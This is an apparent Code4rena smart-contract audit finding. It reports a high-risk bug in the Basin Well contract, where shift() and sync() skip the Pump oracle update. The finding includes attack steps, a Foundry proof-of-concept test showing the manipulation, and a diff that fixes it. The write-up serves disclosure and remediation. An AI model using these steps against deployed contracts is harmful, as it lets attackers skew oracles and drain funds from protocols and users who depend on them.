## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- sponsor confirmed
- H-01

# [Pumps are not updated in the shift() and sync() functions, allowing oracle manipulation](https://github.com/code-423n4/2023-07-basin-findings/issues/136) 

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L352-L377
https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L590-L598


# Vulnerability details

## Vulnerability details

The `Wall` contract mandates that the `Pumps` should be updated with the previous block's `reserves` in case `reserves` are changed in the current block to reflect the price change accurately.

However, this doesn't happen in the `shift()` and `sync()` functions, providing an opportunity for any user to manipulate the `reserves` in the current block before updating the `Pumps` with new manipulated `reserves` values.

## Impact

The `Pumps` (oracles) can be manipulated. This can affect any contract/protocol that utilizes `Pumps` as on-chain oracles.

## Proof of Concept

1. A malicious user performs a `shift()` operation to update `reserve`s to desired amounts in the current block, thereby overriding the `reserves` from the previous block.
2. The user performs `swapFrom()/swapTo()` operations to extract back the funds used in the `shift()` function. As a result, the attacker is not affected by any arbitration as pool `reserves` revert back to the original state.
3. The `swapFrom()/swapTo()` operations trigger the `Pumps` update with invalid `reserves`, resulting in oracle manipulation.

Note: The `sync()` function can also manipulate `reserves` in the current block, but it's less useful than `shift()` from an attacker's perspective.

## PoC Tests

This test illustrates how to use `shift()` to manipulate `Pumps` data.

Create `test/pumps/Pump.Manipulation.t.sol` and run `forge test --match-test manipulatePump`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {TestHelper, Call} from "../TestHelper.sol";
import {MultiFlowPump} from "src/pumps/MultiFlowPump.sol";
import {from18} from "test/pumps/PumpHelpers.sol";

contract PumpManipulationTest is TestHelper {
    MultiFlowPump pump;

    function setUp() public {
        pump = new MultiFlowPump(
            from18(0.5e18), // cap reserves if changed +/- 50% per block
            from18(0.5e18), // cap reserves if changed +/- 50% per block
            12, // block time
            from18(0.9e18) // ema alpha
        );

        Call[] memory _pumps = new Call[](1);
        _pumps[0].target = address(pump);
        _pumps[0].data = new bytes(0);

        setupWell(2,_pumps);
    }

    function test_manipulatePump() public prank(user) {
        uint256 amountIn = 1 * 1e18;

        // 1. equal swaps, reserves should be unchanged
        uint256 amountOut = well.swapFrom(tokens[0], tokens[1], amountIn, 0, user, type(uint256).max);
        well.swapFrom(tokens[1], tokens[0], amountOut, 0, user, type(uint256).max);

        uint256[] memory lastReserves = pump.readLastReserves(address(well));
        assertApproxEqAbs(lastReserves[0], 1000 * 1e18, 1);
        assertApproxEqAbs(lastReserves[1], 1000 * 1e18, 1);

        // 2. equal shift + swap, reserves should be unchanged (but are different)
        increaseTime(120);
        
        tokens[0].transfer(address(well), amountIn);
        amountOut = well.shift(tokens[1], 0, user);
        well.swapFrom(tokens[1], tokens[0], amountOut, 0, user, type(uint256).max);

        lastReserves = pump.readLastReserves(address(well));
        assertApproxEqAbs(lastReserves[0], 1000 * 1e18, 1);
        assertApproxEqAbs(lastReserves[1], 1000 * 1e18, 1);
    }
}
```

## Tools Used

Manual review, Foundry

## Recommended Mitigation Steps

Update `Pumps` in the `shift()` and `sync()` function.

```diff
    function shift(
        IERC20 tokenOut,
        uint256 minAmountOut,
        address recipient
    ) external nonReentrant returns (uint256 amountOut) {
        IERC20[] memory _tokens = tokens();
-       uint256[] memory reserves = new uint256[](_tokens.length);
+       uint256[] memory reserves = _updatePumps(_tokens.length);
```

```diff
    function sync() external nonReentrant {
        IERC20[] memory _tokens = tokens();
-       uint256[] memory reserves = new uint256[](_tokens.length);
+       uint256[] memory reserves = _updatePumps(_tokens.length);
```


## Assessed type

Oracle